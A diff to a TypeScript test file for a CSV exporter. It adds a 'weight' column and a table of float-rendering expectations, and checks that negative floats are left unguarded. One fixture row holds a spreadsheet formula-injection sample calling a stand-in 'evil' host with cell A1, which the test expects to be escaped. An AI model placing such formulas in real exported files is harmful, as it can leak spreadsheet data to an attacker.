@@ -92,20 +92,64 @@ describe("the shared golden document — same bytes as the server writer", () =>
     // The literal is asserted twice, in two languages, over the same values.
     // Python builds it with csv_text([header] + [[csv_cell(v) …]]); this side
     // with buildCsv(). If one writer drifts, that suite goes red and names it.
-    const header = ["id", "name", "notes", "active", "total", "when"];
+    const header = ["id", "name", "notes", "active", "total", "when", "weight"];
     const rows = [
-      [1, "Widget", "plain", true, "19.99", "2026-10-20T21:00:00"],
-      [2, "Gizmo, big", 'say "hi"', false, "-5.00", null],
+      [1, "Widget", "plain", true, "19.99", "2026-10-20T21:00:00", 1.0],
+      [2, "Gizmo, big", 'say "hi"', false, "-5.00", null, -0.5],
       [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', true, "-7.25",
-       "2026-10-20T21:00:00"],
+       "2026-10-20T21:00:00", 1e-7],
     ];
     expect(buildCsv(header, rows)).toBe(
-      "id,name,notes,active,total,when\r\n" +
-      "1,Widget,plain,true,19.99,2026-10-20T21:00:00\r\n" +
-      '2,"Gizmo, big","say ""hi""",false,-5.00,\r\n' +
+      "id,name,notes,active,total,when,weight\r\n" +
+      "1,Widget,plain,true,19.99,2026-10-20T21:00:00,1\r\n" +
+      '2,"Gizmo, big","say ""hi""",false,-5.00,,-0.5\r\n' +
       "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\"," +
-      "true,-7.25,2026-10-20T21:00:00\r\n",
+      "true,-7.25,2026-10-20T21:00:00,1e-7\r\n",
     );
+  });
+});
+
+/** The float table from plugin/tests/test_csv_export.py::TestCsvWriterParity.
+ *  Same values, same expectations, two languages: this side is the reference
+ *  (String() is exactly what layer 1 writes after JSON.parse of a DRF body),
+ *  so the server writer is the one this table holds to it. */
+const FLOAT_PARITY: [number, string][] = [
+  [0.0, "0"],
+  [-0.0, "0"],
+  [1.0, "1"],
+  [100.0, "100"],
+  [1e6, "1000000"],
+  [19.99, "19.99"],
+  [48.5, "48.5"],
+  [0.5, "0.5"],
+  [1 / 3, "0.3333333333333333"],
+  [0.1 + 0.2, "0.30000000000000004"],
+  [1e-5, "0.00001"],
+  [1e-6, "0.000001"],
+  [1e-7, "1e-7"],
+  [-1e-9, "-1e-9"],
+  [2.5e-13, "2.5e-13"],
+  [1e16, "10000000000000000"],
+  [1e17, "100000000000000000"],
+  [1e20, "100000000000000000000"],
+  [1e21, "1e+21"],
+  [6.02e23, "6.02e+23"],
+  [1e100, "1e+100"],
+  [1.7976931348623157e308, "1.7976931348623157e+308"],
+  [5e-324, "5e-324"],
+  [123456789012345680000.0, "123456789012345680000"],
+  [-0.00042, "-0.00042"],
+];
+
+describe("csvCell — floats are the browser's own rendering", () => {
+  it.each(FLOAT_PARITY)("String(%s) is the byte both export layers write", (value, expected) => {
+    expect(csvCell(value)).toBe(expected);
+  });
+
+  it("leaves a negative float unguarded — the guard is for text", () => {
+    expect(csvCell(-1e-9)).toBe("-1e-9");
+    expect(csvCell(-2.0)).toBe("-2");
+    expect(csvCell("-1e-9")).toBe("'-1e-9"); // the same characters AS text do guard
   });
 });
 
